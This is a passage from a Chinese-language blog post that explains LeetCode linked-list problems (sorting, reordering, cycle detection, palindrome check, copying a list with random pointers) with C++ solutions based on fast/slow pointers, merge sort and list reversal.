fast=fast-&gt;next-&gt;next;</span><br><span class="line">       }</span><br><span class="line">       <span class="keyword">return</span> slow;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>总结：如果链表长度是偶数，返回中间偏右的位置 </p><p>且fast如果初始化为head-&gt;next 返回中间偏左的位置。</p><p>奇数长度则两者相同。</p><h4 id="148-排序链表"><a href="#148-排序链表" class="headerlink" title="148. 排序链表"></a><a href="https://leetcode-cn.com/problems/sort-list/">148. 排序链表</a></h4><blockquote><p>在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序。</p><p>示例 1:</p><p>输入: 4-&gt;2-&gt;1-&gt;3<br>输出: 1-&gt;2-&gt;3-&gt;4<br>示例 2:</p><p>输入: -1-&gt;5-&gt;3-&gt;4-&gt;0<br>输出: -1-&gt;0-&gt;3-&gt;4-&gt;5</p></blockquote><h5 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h5><p>归并排序链表，找中点和合并操作</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mergeSort</span>(head);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//寻找链表中点，快慢指针，快的到达终点，慢的刚好到中点 </span></span><br><span class="line">    <span class="comment">//当链表的长度是奇数时，slow 恰巧停在中点位置；如果长度是偶数，slow 最终的位置是中间偏右：</span></span><br><span class="line">    <span class="comment">//此题我们让head先走，则停在中间偏左的位置</span></span><br><span class="line">    <span class="comment">//148 143 141都有快慢指针</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">findMiddle</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//合并两个链表，参考归并排序</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">mergeTwoLists</span><span class="params">(ListNode*left,ListNode*right)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode *dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *head=dummy;</span><br><span class="line">        <span class="keyword">while</span>(left!=<span class="literal">NULL</span>&amp;&amp;right!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(left-&gt;val&gt;right-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=right;</span><br><span class="line">                right=right-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=left;</span><br><span class="line">                left=left-&gt;next;</span><br><span class="line">            }   </span><br><span class="line">            <span class="comment">//下一个</span></span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//处理剩下节点</span></span><br><span class="line">        <span class="keyword">while</span>(left!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=left;</span><br><span class="line">                head=head-&gt;next;</span><br><span class="line">                left=left-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">while</span>(right!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=right;</span><br><span class="line">                head=head-&gt;next;</span><br><span class="line">                right=right-&gt;next;</span><br><span class="line">            }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode *<span class="title">mergeSort</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        ListNode *middle=<span class="built_in">findMiddle</span>(head);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 断开中间节点</span></span><br><span class="line">        ListNode* tail=middle-&gt;next;</span><br><span class="line">        middle-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//左右分别进行归并排序</span></span><br><span class="line">        ListNode *left=<span class="built_in">mergeSort</span>(head);</span><br><span class="line">        ListNode *right=<span class="built_in">mergeSort</span>(tail);</span><br><span class="line">        ListNode *res=<span class="built_in">mergeTwoLists</span>(left, right);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="143-重排链表"><a href="#143-重排链表" class="headerlink" title="143. 重排链表"></a><a href="https://leetcode-cn.com/problems/reorder-list/">143. 重排链表</a></h4><blockquote><p>给定一个单链表 L：L0→L1→…→Ln-1→Ln ，<br>将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→…</p><p>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</p><p>示例 1:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.<br>示例 2:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3.</p></blockquote><p>此题目为2019年计算机统考408真题</p><p>思路：找到中点断开，翻转后面部分，然后合并前后两个链表</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//快慢指针找中点，同上一题 </span></span><br><span class="line">    <span class="comment">//148 143 141都有快慢指针</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">findMiddle</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;</span><br><span class="line">        <span class="comment">//如果是偶数个节点，返回中间偏右的位置 </span></span><br><span class="line">        <span class="comment">//你改成fast=head-&gt;next返回中间偏左也是对的</span></span><br><span class="line">        <span class="comment">//有趣吧，画个图就知道了</span></span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//合并两个链表</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1,ListNode*l2)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode* dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        <span class="type">bool</span>  toggle =<span class="literal">true</span>;</span><br><span class="line">        ListNode *head=dummy;</span><br><span class="line">        <span class="comment">//间断连接两个链表</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>&amp;&amp;l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(toggle)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=l1;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=l2;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            toggle=!toggle;</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//连接剩下的节点</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            head-&gt;next=l1;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            head-&gt;next=l2;</span><br><span class="line">            l2=l2-&gt;next;</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reorderList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//找到中点 断开</span></span><br><span class="line">        ListNode *middle=<span class="built_in">findMiddle</span>(head);</span><br><span class="line">        ListNode *tail=middle-&gt;next;</span><br><span class="line">        middle-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//翻转链表</span></span><br><span class="line">        ListNode *cur,*pre;</span><br><span class="line">        pre=tail;</span><br><span class="line">        cur=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            ListNode *temp=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            temp-&gt;next=cur;</span><br><span class="line">            cur=temp;</span><br><span class="line">        }</span><br><span class="line">        tail=cur;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//合并链表</span></span><br><span class="line">        head-&gt;next=<span class="built_in">mergeTwoLists</span>(head,tail)-&gt;next;                </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141. 环形链表"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. 环形链表</a></h4><blockquote><p>给定一个链表，判断链表中是否有环。</p><p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p></blockquote><blockquote><p> 示例 1：</p><p> 输入：head = [3,2,0,-4], pos = 1</p><p> 输出：true</p><p> 解释：链表中有一个环，其尾部连接到第二个节点。</p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/26939/circularlinkedlistss.png" alt="img"></p><p> 示例 2：</p><p> 输入：head = [1,2], pos = 0</p><p> 输出：true</p><p> 解释：链表中有一个环，其尾部连接到第一个节点。</p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/26939/circularlinkedlist_test2.png" alt="img"></p><p> 示例 3：</p><p> 输入：head = [1], pos = -1<br> 输出：false<br> 解释：链表中没有环。</p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/26939/circularlinkedlist_test3.png" alt="img"></p></blockquote><p>快慢指针即可，就像你在操场跑步，操场有环，只要你和她速度不一样，你们总能与她相遇，如果是直线，她到了终点，你就再也追不上她</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//148 143 141 142都有快慢指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode *fast,*slow;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="comment">// 比较指针是否相等</span></span><br><span class="line">            <span class="keyword">if</span>(slow==fast)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="142-环形链表-II"><a href="#142-环形链表-II" class="headerlink" title="142. 环形链表 II"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. 环形链表 II</a></h4><blockquote><p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p><p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p><p>说明：不允许修改给定的链表。</p><p>示例 ：</p><p>输入：head = [3,2,0,-4], pos = 1<br>输出：tail connects to node index 1<br>解释：链表中有一个环，其尾部连接到第二个节点。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/26939/circularlinkedlist.png" alt="img"></p></blockquote><p>。</p><h5 id="Floyd-算法"><a href="#Floyd-算法" class="headerlink" title="Floyd 算法"></a>Floyd 算法</h5><p>你在操场跑步，操场有环，只要你和她速度不一样，你们总能与她相遇，如果是直线，她到了终点，你就再也追不上她。此题分为两个阶段，第一个阶段先用快慢指针测试是否有环，第二阶段慢指针回到头head,然后各自以相同速度前进，相遇点即为入环处（可以自己画图尝试）。严格的数学证明可参考leetcode官方题解。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;<span class="comment">//如果这里是fast=fast-&gt;next，那么下面该怎么改？</span></span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)</span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//回到起点，各自以相同速度前进</span></span><br><span class="line">                slow=head;</span><br><span class="line">                <span class="keyword">while</span>(slow!=fast)</span><br><span class="line">                {</span><br><span class="line">                    slow=slow-&gt;next;</span><br><span class="line">                    fast=fast-&gt;next;</span><br><span class="line"></span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">return</span> slow;</span><br><span class="line">            }                        </span><br><span class="line">        }     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234. 回文链表"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list/">234. 回文链表</a></h4><blockquote><p>请判断一个链表是否为回文链表。</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入: 1-&gt;2</span><br><span class="line">&gt;输出: false</span><br></pre></td></tr></tbody></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入: 1-&gt;2-&gt;2-&gt;1</span><br><span class="line">&gt;输出: true</span><br></pre></td></tr></tbody></table></figure></blockquote><p>先找到链表中点，然后后面的翻转链表，一个个比较。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//偶数长度slow是中间偏左的节点</span></span><br><span class="line">        <span class="comment">//奇数长度slow是中点</span></span><br><span class="line"></span><br><span class="line">        ListNode *cur,*pre,*tail,*temp;</span><br><span class="line"><span class="comment">//分离两个链表</span></span><br><span class="line">        tail=slow-&gt;next;</span><br><span class="line">        slow-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//翻转链表</span></span><br><span class="line">        pre=tail;</span><br><span class="line">        cur=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            temp=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            temp-&gt;next=cur;</span><br><span class="line">            cur=temp;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//原链表的最后一个节点现在变成头结点</span></span><br><span class="line">        tail=cur;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">NULL</span>&amp;&amp;tail!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(tail-&gt;val!=head-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">            tail=tail-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="138-复制带随机指针的链表"><a href="#138-复制带随机指针的链表" class="headerlink" title="138. 复制带随机指针的链表"></a><a href="https://leetcode-cn.com/problems/copy-list-with-random-pointer/">138. 复制带随机指针的链表</a></h4><blockquote><p>给定一个链表，每个节点包含一个额外增加的随机指针，该指针可以指向链表中的任何节点或空节点。</p><p>要求返回这个链表的 深拷贝。 </p><p>我们用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示：</p><p>val：一个表示 Node.val 的整数。<br>random_index：随机指针指向的节点索引（范围从 0 到 n-1）；如果不指向任何节点，则为  null 。</p></blockquote><p>复制节点跟在原节点后面即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 